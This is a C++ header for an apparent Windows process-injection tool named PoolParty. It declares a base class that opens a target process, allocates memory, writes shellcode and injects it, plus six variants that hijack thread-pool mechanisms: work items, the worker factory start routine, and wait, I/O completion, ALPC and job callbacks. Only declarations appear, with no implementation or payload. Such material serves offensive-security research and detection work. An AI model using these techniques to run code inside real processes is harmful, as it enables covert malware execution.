#pragma once

#include <Windows.h>

#include <iostream>
#include <vector>
#include <string>

#include "Misc.hpp"
#include "Native.hpp"
#include "WorkerFactory.hpp"
#include "Duplicator.hpp"
#include "Exceptions.hpp"
#include "Memory.hpp"
#include "ThreadPool.hpp"
#include "WinApi.hpp"

// TODO: Change macros to constexpr if possible

#define POOL_PARTY_ALPC_PORT_NAME L"\\RPC Control\\PoolPartyALPCPort"

#define INIT_UNICODE_STRING(str) { sizeof(str) - sizeof((str)[0]), sizeof(str) - sizeof((str)[0]), const_cast<PWSTR>(str) }

typedef struct _POOL_PARTY_CMD_ARGS
{
	BOOL bDebugPrivilege;
	int VariantId;
	int TargetPid;
} POOL_PARTY_CMD_ARGS, * PPOOL_PARTY_CMD_ARGS;

class PoolParty
{
protected:
	DWORD m_dwTargetPid;
	std::shared_ptr<HANDLE> m_p_hTargetPid;
	std::shared_ptr<HANDLE> m_p_hWorkerFactory;
	unsigned char* m_cShellcode;
	SIZE_T m_szShellcodeSize;
	PVOID m_ShellcodeAddress;
	WORKER_FACTORY_BASIC_INFORMATION m_WorkerFactoryInformation;

public:
	PoolParty(DWORD dwTargetPid, unsigned char* cShellcode);
	std::shared_ptr<HANDLE> GetTargetProcessHandle();
	std::shared_ptr<HANDLE> GetWorkerFactoryHandle();
	WORKER_FACTORY_BASIC_INFORMATION GetWorkerFactoryBasicInformation();
	virtual LPVOID AllocateShellcodeMemory();
	void WriteShellcode();
	virtual void SetupExecution() PURE;
	void Inject();
	~PoolParty();
};

class RemoteWorkItemInsertion : public PoolParty {
public: 
	RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteWorkItemInsertion();
};

class WorkerFactoryStartRoutineOverwrite : public PoolParty {
public:
	WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	LPVOID AllocateShellcodeMemory() override;
	~WorkerFactoryStartRoutineOverwrite();
};

class RemoteWaitCallbackInsertion : public PoolParty {
public:
	RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteWaitCallbackInsertion();
};

class RemoteIoCompletionCallbackInsertion : public PoolParty {
public:
	RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteIoCompletionCallbackInsertion();
};

class RemoteAlpcCallbackInsertion : public PoolParty {
public:
	RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteAlpcCallbackInsertion();
};

class RemoteJobCallbackInsertion : public PoolParty {
public:
	RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode);
	void SetupExecution() override;
	~RemoteJobCallbackInsertion();
};